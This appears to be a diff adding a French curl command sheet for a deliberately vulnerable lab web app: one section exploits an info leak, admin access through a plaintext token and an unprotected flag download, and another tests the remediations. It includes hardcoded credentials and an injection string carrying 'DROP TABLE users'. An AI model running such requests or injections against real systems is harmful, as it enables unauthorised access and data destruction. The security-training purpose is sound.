@@ -1,0 +1,19 @@
+# === COMMANDES POUR EXPLOITER LES FAILLES ===
+# 1. Recherche vulnérable (fuite d'infos)
+curl -X POST -d "q=alice" https://298cf0a3-a6cc-46de-be6f-a408ac298372-00-x5l7y1a9kvhw.kirk.replit.dev/search
+
+# 2. Accès admin non autorisé (token en clair)
+curl "https://298cf0a3-a6cc-46de-be6f-a408ac298372-00-x5l7y1a9kvhw.kirk.replit.dev/admin?token=admintoken123"
+
+# 3. Téléchargement du flag non protégé
+curl -O https://298cf0a3-a6cc-46de-be6f-a408ac298372-00-x5l7y1a9kvhw.kirk.replit.dev/flag
+
+# === COMMANDES POUR TESTER LES CORRECTIFS (Après remediation) ===
+# 1. Tester le login (doit réussir)
+curl -X POST -d "username=admin&password=admin123" https://298cf0a3-a6cc-46de-be6f-a408ac298372-00-x5l7y1a9kvhw.kirk.replit.dev/login
+
+# 2. Tenter d'accéder à /flag SANS auth (doit échouer avec 403)
+curl -I https://298cf0a3-a6cc-46de-be6f-a408ac298372-00-x5l7y1a9kvhw.kirk.replit.dev/flag
+
+# 3. Tester une injection dans /search (doit échouer avec 400)
+curl -X POST -d "q=test; DROP TABLE users" https://298cf0a3-a6cc-46de-be6f-a408ac298372-00-x5l7y1a9kvhw.kirk.replit.dev/search
